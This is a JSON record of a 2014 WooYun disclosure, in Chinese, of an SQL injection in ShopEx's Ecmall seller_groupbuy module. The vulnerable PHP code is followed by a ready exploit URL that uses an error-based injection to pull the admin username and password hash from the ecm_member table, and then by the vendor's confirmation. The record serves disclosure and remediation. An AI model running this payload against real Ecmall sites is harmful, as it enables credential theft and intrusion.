{"id": 3975, "wybug_id": "wooyun-2014-052187", "wybug_title": "Ecmall SQL注入二", "wybug_corp": "ShopEx", "wybug_author": "ecbug", "wybug_date": "2014-02-28 14:14", "wybug_open_date": "2014-05-29 14:14", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-29：\t细节向公众公开  简要描述： 这个洞我事先搜索了下乌云和各大论坛，没有查到结果，但是不排除数字X平台或者其他渠道厂商已经获知漏洞详情，知道有漏洞而不修补，我还得接着提。 详细说明：  缺陷文件：/app/seller_groupbuy.app.phpfunction edit()    {        $id = empty($_GET['id']) ? 0 : $_GET['id']; //未过滤        if (!$id)        {            $this->show_warning('no_such_groupbuy');            return false;        }        if (!$this->_ican($id, ACT))   //进入ican函数        {            $this->show_warning('Hacking Attempt');            return;        }function _ican($id, $act = '')    {        $state_permission = array(            GROUP_PENDING   => array('start', 'edit', 'drop'),            GROUP_ON        => array('cancel', 'desc', 'log', 'finished', 'export_ubbcode'),            GROUP_END       => array('cancel', 'desc', 'finished', 'log'),            GROUP_FINISHED  => array('drop', 'log', 'view_order'),            GROUP_CANCELED  => array('drop', 'log')        );        $group = $this->_groupbuy_mod->get(array(            'join'       => 'belong_goods',            'conditions' => 'gb.group_id=' . $id . ' AND g.store_id=' . $this->_store_id,// id可控，SQL语句进入数据库查询造成注射   漏洞证明：  exp：index.php?app=seller_groupbuy&act=edit&id=1 and (select user_name from ecm_member where user_id=1 union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecm_member limit 0,1))a from information_schema.tables group by a)b)#\n\n   修复方案：  漏洞很简单吧，那还不赶紧补一下？   版权声明：转载请注明来源 ecbug@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-02-28 14:50 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-28 14:33 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  我估计厂商回复是这样的：非常感谢您为shopex信息安全做的贡献改漏洞通过其他渠道已经提交过，并在处理中谢谢    \n     2014-05-29 18:04 |    \t\t笨猫猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:5        | 喵勒个咪的)\t\t \n  @pandas 厂商好打脸。啪的一声    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}